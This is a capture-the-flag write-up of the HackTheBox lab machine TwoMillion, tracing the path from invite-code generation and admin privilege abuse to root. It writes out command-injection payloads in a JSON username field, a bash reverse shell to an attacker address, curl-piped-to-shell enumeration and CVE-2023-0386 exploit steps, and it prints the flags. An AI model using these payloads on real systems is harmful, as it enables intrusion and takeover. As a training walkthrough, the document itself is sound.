---
title: "TwoMillion"
machine: TwoMillion
tags: HackTheBox Machines
---
#### Write-Up for the HackTheBox Machine - TwoMillion in Guided Mode
<!--more-->
---
#### 001: Scan

The victim machine was scanned for potential open ports and services using `nmap`.
Available ports and services, according to the tool was `port 22(ssh)` and `port 80(http)`.

```bash
nmap -sT 10.10.11.221
```
- `-sT` | switch specifies scan for tcp ports

{{< screenshots "shot-001" >}}

---
#### 002: Hostname Mapping

To be able to view the website in browser, the target IP must be resolved by creating a hostname mapping in /etc/hosts.

{{< screenshots "shot-002" >}}

---
#### 003: Website Analysis

Burpsuite was utilized to examine available paths exposed from the victim.
As the proxy of the web tool was running, the website had shown various paths under Burpsuite's `target` tab.

`http://2million.htb/invite` was observed that an invite code is required for **Sign Up**.

{{< screenshots "shot-003" >}}

---
#### 004: Obfuscated Script

After further examination of the website's source, under js/invite.min.js an eval based javascript packer obfuscation script is found in the response window of burpsuite.

{{< screenshots "shot-004" >}}

---
#### 005: Deobfuscation

Utilizing https://tunganhken.github.io/de4js/ the obfuscated JavaScript was deobfuscated and beautified, revealing functions that directly invoke backend API endpoints.

{{< screenshots "shot-005" >}}

---
#### 006: Endpoint Request

POST requests were sent to each endpoint, using `curl`, and was found that `/api/v1/invite/how/to/generate` outputed a json response with a ROT13 ciphered value for the key `data`.

Command:
```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

{{< screenshots "shot-006" >}}

---
#### 007: ROT13 Decipher

https://cryptii.com/pipes/rot13-decoder is a web tool that helped with the decipher of the found ROT13. 
The tool returned the following output:
- `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`

Thus, a POST request was made to the newly found endpoint, which returned a Base64 endoded value for the key `code`.

{{< screenshots "shot-007" >}}

---
#### 008: Base64 Decode

https://www.base64decode.org/ was used to decode the Base64 encoded string in the from the POST response.
The tool returned the following output:
- `X43BI-41KBY-4HMSL-SYVEG`

##### *Note: Each Base64 encoded code is randomly generated, meaning that when decoded the output will be different.*

Once the decoded string is filled in the empty box of `/invite`, a redirection was made to `/register` for registration.
Next, the appropriate details were entered in `/login` and access to our personal `/home` page was granted.

{{< screenshots "shot-008" >}}

---
#### 009: Admin Endpoints

After, further examination of the website, it is found that only within `/home/access` two endpoints share the same prefix `/api/v1`. 
It is observed by hovering over **Connection Pack** and **Regenerate** buttons.

Hence, a browse to `http://2million.htb/api/v1` various other endpoints were showed.

##### *Note: To be able to view /api/v1 responses, the current created user must be logged in. Since the namespace requires authentication via PHPSESSID.*

{{< screenshots "shot-009" >}}

Three endpoints were exposed related to admin, with each respective HTTP method:
- `/api/v1/admin/auth`
- `/api/v1/admin/vpn/generate`
- `/api/v1/admin/settings/update`

---
#### 010: Admin Endpoint Examination

Again with the use of Burpsuite requests were made to each admin related endpoint with the appropriate HTTP method as identified in `/api/v1` namespace.
A GET request to `/api/v1/admin/auth returned` a json response message, indicating that the current logged in user was not an admin.

{{< screenshots "shot-010" >}}

Since, the current user did not have administrative access, a POST request to `/api/v1/admin/vpn/generate`, returned a response indicating the user is unauthorized.

{{< screenshots "shot-011" >}}

Next, a PUT request to `/api/v1/admin/settings/update`, showed a response that could be tampered. 
It seemed the `Content-Type` the API accepted for a PUT request was `application/json`.

{{< screenshots "shot-012" >}}

On `line 11` of the request, the `Content-Type` was specified, and some dummy `key:value` pair was added to test the victim's behavior. 
A returned message response hinted that an email parameter was missing.

{{< screenshots "shot-013" >}}

When a valid email (created user) was added to the json structure, a new message appeared, specifying that `is_admin` also must be added to the structure.

{{< screenshots "shot-014" >}}

As properly assumed, `is_admin` was a boolean variable. 
Hence by passing `1` in `is_admin`, the endpoint response showed that the variable is set to `1(true)`.

{{< screenshots "shot-015" >}}

When a new GET request was made to `/api/v1/admin/auth`, the response indicated that the created user now has administrative privileges.

{{< screenshots "shot-016" >}}

---
#### 011: Endpoint Command Injection

The response from a reqest to `/api/v1/admin/vpn/generate`, contained an OpenVPN client profile generated by an administrative API endpoint. 
Which included CA-signed client certificates and private key, potentially enabling direct VPN access to the internal network with elevated privileges.
Hence, the OpenVNP client generation, appeared like a system level operation. 
Which resulted in a command injection probe, that exposed local directories from the victim.

Command:
```bash
"username":"; ls #"
```
- `;` | command separator
- `#` | ignore the rest of the line (comment)


{{< screenshots "shot-017" >}}

Environment variable values are `key:value` strings stored by the operating system and made available to running processes. 
Effectively, influencing application behaviors without changing code.

When probed the `.env` file on the victim, various `key:value` pairs showed environment variables linked to the database of the application.

```bash
"username":"; cat .env #"
```
- `;` | command separator
- `#` | ignore the rest of the line (comment)

{{< screenshots "shot-018" >}}

---
#### 012: Reverse Shell

Nevertheless, since bash is available on the target, a bash reverse shell payload was injected to the json structure.
Effectively allowing reverse communication to the attacker machine, with system access.
Initially, a Netcat listener was setup on the attacker.

```bash
nc -lvnp 4444
```
- `-lvnp` | set Netcat into listening mode on specified port, with no DNS resolution and verbose output

{{< screenshots "shot-019" >}}

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.190/4444 0>&1' #
```
- bash reverse shell command used in burpsuite json request.

{{< screenshots "shot-020" >}}

Successfully established a reverse shell connection on the attacker machine.

{{< screenshots "shot-021" >}}

---
#### 013: User Flag

At this point the there is access to the system with a common web server user `www-data`.
As admin credentials were found in `.env`, an attemped was made to switch from the current system user to `admin` with `su admin`.
After entering the password `SuperDuperPass123`, as assumed the user bacame `admin`.
Thus, the user flag can be captured with `cat user.txt` located in `/home/admin`.
- `e6028d512a774b66d8248d6f3e6cfe82`

---
#### 014: Victim Enumeration

With `admin` privileges the victim machine was further probed for potential vulnerabilities and misconfigurations with the use of Linpeas. 
Initially, a python server was ran on the attacker, at a location where `linpeas.sh` is normally located `/usr/share/peass/linpeas`. 

```bash
sudo python3 -m http.server 80
```

Therefore, from the victim's shell a GET request using `curl` was made to the locally running python server for `linpeas.sh` and then piped for execution.
Which eventually after some time, the tool provided a comprehensive system enumeration.

```bash
curl <attacker_ip>/linpeas.sh | sh
```

---
#### 015: Privilege Escalation

As observed there were various findings, but what seemed of interest was an email exchange located in `/var/mail`. Indicating that the system was potentially vulnerable to `CVE-2023-0386`.

{{< screenshots "shot-022" >}}

https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c provides a concise exploitation procedure for `CVE-2023-0386`.

The compilation process required `libfuse` for the implemention of the malicious filesystem on the victim.
- `apt install libfuse-dev` | required library
- `gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl` | compliation to statically linked executable, allowing large file support, linking against FUSE and dynamic `libfuse` loading

Then a local python server was locally ran on port 9000, for the download of the exploit on the victim machine with the use of `curl`.

```bash
curl -O http://1<attacker_ip>:9000/poc
```
##### *Note: Command used on the victim's shell*

{{< screenshots "shot-023" >}}

All that was required at this stage of the privilege escalation, was to make the script executable with `chmod +x` and then run it.

{{< screenshots "shot-024" >}}

Thus, the system was fully compromised by becoming root.
Finally, the root flag captured with `cat /root/root.txt`
- `b38a9c59680e596efe9f32a089d14b6f`